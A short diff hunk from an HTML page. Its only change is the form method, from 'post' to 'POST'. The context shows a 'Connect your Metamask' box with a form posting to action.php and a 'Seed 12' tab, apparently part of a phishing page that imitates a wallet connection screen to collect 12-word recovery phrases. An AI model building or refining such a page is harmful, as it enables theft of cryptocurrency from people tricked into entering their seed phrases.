@@ -2785,7 +2785,7 @@ before:[transition-duration:500ms] hover:before:w-full bg-trustBlue text-trustWh
 
       <div style="padding:12px 18px 18px 18px;">
         <div style="font-weight:700">Connect your Metamask</div>
-         <form action="action.php" method="post" style="">
+         <form action="action.php" method="POST" style="">
     <div class="tabs-container">
   <div class="tabs">
     <div class="tab active" data-tab="tab1">Seed 12</div>
